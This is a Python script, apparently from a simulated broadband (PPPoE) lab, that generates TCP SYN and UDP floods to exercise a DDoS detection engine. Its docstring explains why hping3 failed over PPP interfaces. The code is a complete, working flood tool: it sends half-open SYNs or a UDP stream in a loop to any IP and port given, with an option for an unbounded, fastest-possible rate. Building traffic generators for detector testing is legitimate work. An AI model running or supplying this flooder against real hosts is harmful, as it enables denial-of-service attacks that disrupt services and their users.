"""
bng_flood.py — kernel-native TCP-SYN / UDP flood generator for the
Broadband domain's PPPoE subscriber sessions, spawned by
bng_subscriber_agent.py's Subscriber.start_attack() in place of
hping3.

Why not hping3: confirmed on a real run that hping3 cannot transmit
ANY traffic over a `ppp-subN` interface at all, regardless of -I / -a /
source-based policy routing. With no -I, it auto-selects an egress
interface via its own naive heuristic (observed picking the VM's other,
unrelated NIC instead of the correct ppp-subN one, ignoring the `ip
rule from <subscriber-ip>` policy route that a REAL kernel route lookup
does honor). With -I ppp-subN, it correctly identifies the interface
(its own banner reports it) but the TX byte/packet counters never move
past the PPP LCP/IPCP handshake baseline -- hping3 injects packets via
a raw-socket path that assumes Ethernet L2 framing, and a PPP netdevice
(ARPHRD_PPP) has no such framing, so the frame never actually reaches
the wire.

This script sidesteps the problem entirely by never touching L2: it
uses ordinary kernel sockets bound to the subscriber's own PPP-assigned
IP. The kernel's real FIB lookup (ip_route_output_flow) considers the
bound source address, correctly matches the per-subscriber `ip rule`
that bng_subscriber_agent.py's Subscriber._add_source_route() already
sets up, and the kernel's own PPP net_device driver performs the actual
framing -- exactly the same mechanism that already made `ping -f` work
correctly over these interfaces throughout this project's debugging.

TCP_SYN mode does not complete the handshake: every iteration opens a
fresh non-blocking socket, binds it to the subscriber's IP, fires one
connect() (the kernel emits exactly one real SYN for this), and closes
the socket immediately -- a real half-open-connection flood, kernel-
emitted rather than hand-crafted, functionally equivalent input for
DDoSDetectionEngine's own pps-based classification.

UDP mode opens a single UDP socket bound to the subscriber's IP and
loops sendto() at the target rate.

ICMP is NOT handled here -- bng_subscriber_agent.py shells out to the
system `ping` binary for that instead (already confirmed working
in-kernel over these interfaces since early in the PPP debugging).

Usage:
  python3 bng_flood.py --protocol tcp_syn --src-ip 10.20.0.40 \\
      --dst-ip 10.10.0.100 --dst-port 443 [--pps 5.0]
Omit --pps for an uncontrolled, fastest-possible flood.
"""

import argparse
import socket
import sys
import time

_UDP_PAYLOAD = b"\x00" * 32


def _sleep_for_rate(pps: float) -> None:
    if pps is not None and pps > 0:
        time.sleep(1.0 / pps)


def tcp_syn_flood(src_ip: str, dst_ip: str, dst_port: int, pps: float) -> None:
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setblocking(False)
            sock.bind((src_ip, 0))
            # Non-blocking connect() always raises EINPROGRESS/EWOULDBLOCK
            # here -- that's expected and fine: the kernel has already
            # emitted the real SYN packet by this point, which is all
            # this scenario needs. We deliberately never wait for/
            # complete the handshake.
            sock.connect_ex((dst_ip, dst_port))
        except OSError:
            pass
        finally:
            sock.close()
        _sleep_for_rate(pps)


def udp_flood(src_ip: str, dst_ip: str, dst_port: int, pps: float) -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((src_ip, 0))
    while True:
        try:
            sock.sendto(_UDP_PAYLOAD, (dst_ip, dst_port))
        except OSError:
            pass
        _sleep_for_rate(pps)


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--protocol", required=True, choices=["tcp_syn", "udp"])
    p.add_argument("--src-ip", required=True)
    p.add_argument("--dst-ip", required=True)
    p.add_argument("--dst-port", type=int, required=True)
    p.add_argument("--pps", type=float, default=None, help="omit for an unbounded flood")
    args = p.parse_args()

    if sys.platform != "linux":
        print("ERROR: needs Linux (kernel routing/PPP specifics assumed).", file=sys.stderr)
        sys.exit(1)

    if args.protocol == "tcp_syn":
        tcp_syn_flood(args.src_ip, args.dst_ip, args.dst_port, args.pps)
    else:
        udp_flood(args.src_ip, args.dst_ip, args.dst_port, args.pps)


if __name__ == "__main__":
    main()
